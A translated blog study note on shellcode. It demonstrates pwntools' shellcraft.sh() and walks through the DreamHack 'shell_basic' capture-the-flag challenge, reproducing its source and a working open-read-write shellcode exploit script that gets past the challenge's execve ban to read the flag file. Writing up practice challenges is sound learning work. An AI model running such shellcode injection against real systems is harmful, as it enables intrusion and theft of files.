---
title: "[PWNABLE] Shellcode & RTS"
description: "A piece of code used to obtain a Shell, one of the objectives of system hacking with Shellcode. It is composed of bytecode and can be used in a state where the stack area has execution rights (NX-BIT disabled). There is a feature called shellcraft.sh in pwntools. It is a helpful function that generates shellcode, and by using this function, you can"
date: "2023-10-22"
translation_key: "tistory-4706b08f72f8"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Shellcode-RTS"
private: false
---

#### Shellcode

A piece of code used to obtain a Shell, one of the objectives of system hacking.

It is composed of bytecode and can be used in a state where the stack area has execution permissions (NX-BIT disabled).

There is a feature called shellcraft.sh in pwntools.

This is a helpful function that generates shellcode, and using this function allows you to easily create shellcode with the desired functionality.

```
from pwn import*

shellcode = shellcraft.sh()
print(shellcode)
print(hexdump(asm(shellcode)))
```

Let's look at the result when the function is executed.

![](/assets/images/tistory/tistory-4706b08f72f8/001.png)

The assembly part is the generated code, and

the hex value below corresponds to the bytecode of the shellcode.

Since nothing was put inside the parentheses of shellcraft.sh(), the default code that executes a basic shell is created.

In the subsequent shell_basic problem, we will need to create code that reads a specific file, so

we will add additional explanations in that section.

* * *

#### DreamHack shell_basic problem

The shell_basic problem is a problem from DreamHack for practicing return to shellcode.

First, let's look at the given code.

```
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  void (*sc)();

  init();

  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

Looking for vulnerabilities in the code first.

```
printf("shellcode: ");
read(0, shellcode, 0x1000);

sc = (void *)shellcode;
sc();
```

In the main function, the value inserted into the shellcode is made into a function's functionality and executed.

Additionally, it is set up to prevent the use of shellcode that uses execve.

On the problem page, the path to the flag file is given as follows.

/home/shell_basic/flag_name_is_loooooong

Therefore, we need to create shellcode that reads this part.

To read the file, three steps are required.

1. Open the file

2. Read the file content

3. Output the read content

Therefore, it should be used in the order of open => read => write.

Writing this as code would look like the following.

```
shellcraft.open(파일 경로)

shellcraft.read(rax, rsp, 0x100)

shellcraft.write(1,rsp,0x100)
```

The reason the first argument in read is used as rax is because

the function call convention used in the file is sys V.

That is, the return value of the function is stored in the rax register, and

the return value is used as fd to check if the file was opened normally before proceeding to read.

The overall payload can be structured as follows.

The following collapsed text is the final payload.

Read more

```
p=remote('host3.dreamhack.games',20328)
context.arch = "amd64"

flag_name = "/home/shell_basic/flag_name_is_loooooong"

payload = shellcraft.open(flag_name)
payload += shellcraft.read('rax','rsp',0x100)
payload += shellcraft.write(1,'rsp',0x100)

p.sendlineafter(b": ",asm(payload))
print(p.recv())

p.interactive()
```

When executed, it can read the flag normally.

![](/assets/images/tistory/tistory-4706b08f72f8/002.png)